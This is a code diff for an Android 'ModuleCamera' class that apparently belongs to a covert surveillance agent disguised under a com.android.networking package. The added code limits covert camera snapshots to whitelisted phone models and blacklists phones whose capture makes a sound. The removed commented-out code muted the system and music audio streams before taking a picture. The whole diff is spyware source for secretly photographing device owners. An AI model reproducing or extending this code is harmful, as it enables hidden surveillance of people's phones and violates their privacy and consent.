@@ -34,13 +34,53 @@ import com.android.networking.interfaces.SnapshotManager;
 import com.android.networking.util.Check;
 import com.android.networking.util.Utils;
 
-//SNIPPET http://marakana.com/forums/android/examples/39.html
+//MANUAL http://developer.android.com/guide/topics/media/camera.html
 /**
  * The Class ModuleCamera.
  */
 public class ModuleCamera extends BaseInstantModule {
 
 	private static final String TAG = "ModuleCamera"; //$NON-NLS-1$
+
+	// Motorola XT910 (suono), Samsung Next (suono), HTC Explorer A310e (suono)
+	String[] blackList=new String[]{ "XT910", "GT-S5570",  "HTC Explorer A310e"};
+
+	
+	// camera whitelist, module enabled if Build.MODEL into this lits
+	// Sony XPERIA, Samsung S3, HTC Explorer A310e, Nexus
+	String[] whiteList=new String[]{"LT18i", 
+			"GT-I9300", "GT-I9100", "Galaxy Nexus", "HTC Vision" };
+
+	/*
+	 * (non-Javadoc)
+	 * 
+	 * @see com.ht.AndroidServiceGUI.agent.AgentBase#parse(byte[])
+	 */
+	@Override
+	public boolean parse(ConfModule conf) {
+		
+		boolean force = conf.getBoolean("force", false);
+		boolean face = conf.getBoolean("face", false);
+		
+		if(force){
+			return checkCameraHardware();
+		}
+		
+		// whitelist check
+		for (String white : whiteList) {
+			if(Build.MODEL.equals(white)){
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (parse), found white: " + Build.MODEL);
+				}
+				return checkCameraHardware();
+			}
+		}
+		
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (parse), unknown Build.Model:" +Build.MODEL);
+		}
+		return false;
+	}
 
 	@Override
 	public void actualStart() {
@@ -70,29 +110,6 @@ public class ModuleCamera extends BaseInstantModule {
 	    }
 	}
 	
-	String[] whiteList=new String[]{"LT18i", "GT-I9300"};
-	/*
-	 * (non-Javadoc)
-	 * 
-	 * @see com.ht.AndroidServiceGUI.agent.AgentBase#parse(byte[])
-	 */
-	@Override
-	public boolean parse(ConfModule conf) {
-		for (String white : whiteList) {
-			if(Build.MODEL.equals(white)){
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (parse), found white: " + Build.MODEL);
-				}
-				return checkCameraHardware();
-			}
-		}
-		
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " (parse), unknown Build.Model:" +Build.MODEL);
-		}
-		return false;
-	}
-
 	/**
 	 * Snapshot.
 	 * 
@@ -107,50 +124,7 @@ public class ModuleCamera extends BaseInstantModule {
 		Intent intent = new Intent(Status.getAppContext(), CGui.class);
 		intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
 		Status.getAppContext().startActivity(intent);
-		
-		/*	Utils.sleep(1000);
-			if (status.preview != null) {
-				// status.gui.addPreview();
-				final ModuleCamera moduleCamera = this;
-				Status.self().preview.post(new Runnable() {
-					@Override
-					public void run() {
-						if (Status.self().preview.startCamera(moduleCamera)) {
-							if (Cfg.DEBUG) {
-								Check.log(TAG + " (snapshot), camera started");
-							}
-							
-							Utils.sleep(500);
-							
-							AudioManager audioManager = (AudioManager) Status.getAppContext().getSystemService(Context.AUDIO_SERVICE);
-		
-							audioManager.setStreamMute(AudioManager.STREAM_SYSTEM, true);
-							audioManager.setStreamMute(AudioManager.STREAM_MUSIC, true);
-						
-
-							Status.self().preview.click();
-					
-					
-						}else{
-								if (Cfg.DEBUG) {
-									Check.log(TAG + " (snapshot), cannot start camera");
-								}
-								Status.self().preview.stopCamera();
-								Status.self().gui.removePreview();
-						}
-					
-					}
-				});
-			} else {
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (snapshot), null preview");
-				}
-			}
-		} else {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (snapshot), null gui :");
-			}
-		}*/
+				
 	}
 
 
